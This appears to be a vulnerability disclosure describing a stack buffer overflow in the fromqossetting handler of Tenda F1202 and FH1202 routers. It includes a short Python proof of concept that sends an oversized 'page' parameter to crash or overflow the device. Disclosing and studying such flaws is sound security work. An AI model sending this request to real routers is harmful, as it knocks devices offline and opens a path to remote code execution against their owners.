# Tenda Router Vulnerability on fromqossetting function

This vulnerability lies in the `/goform/fromqossetting` page which influences the lastest version of Tenda Router F1202,FH1202. (The latest version is [F1202V1.0BR_V1.2.0.20(408)](https://www.tenda.com.cn/download/detail-2671.html))[FH1202_V1.2.0.19_EN](https://www.tendacn.com/us/download/detail-2693.html) and influence PA202,PW201A,4G300

## Vulnerability Description

There is a **stack-based buffer overflow** vulnerability in function `page`.

In function `fromqossetting` it reads 1 user provided parameters `page` into `v4`, and the variable is passed into function `sprintf` without any length check, which may overflow the stack-based buffer `v7`.

![Vulnerability Function](./vuln.png)

So by requesting the page `/goform/fromqossetting`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.

## PoC

```python
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/fromqossetting?"
url += "page=" + "s" * 0x200
url += "&op=no&qos=0"


response = requests.get(url)
```

## Timeline

* 2022-06-29: Report to CVE & CNVD;


## Acknowledge